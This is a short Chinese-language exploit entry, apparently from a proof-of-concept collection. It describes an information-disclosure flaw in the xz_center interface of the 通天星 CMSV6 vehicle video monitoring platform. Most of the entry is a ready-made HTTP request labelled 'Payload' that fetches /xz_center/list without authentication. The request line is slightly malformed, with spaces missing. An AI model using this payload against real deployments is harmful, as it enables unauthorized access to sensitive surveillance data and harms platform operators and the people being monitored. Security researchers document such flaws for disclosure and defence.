**漏洞描述：**

天星CMSV6接口xz_center存在信息泄露漏洞，攻击者可以通过直接访问获取敏感信息。

**影响版本：**

通天星CMSV6车载视频监控平台

**Payload：**

```
GET/xz_center/list?page=1HTTP/1.1
Host:host
User-Agent:Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept:*/*
Accept-Encoding:gzip, deflate
Connection:close
```

---
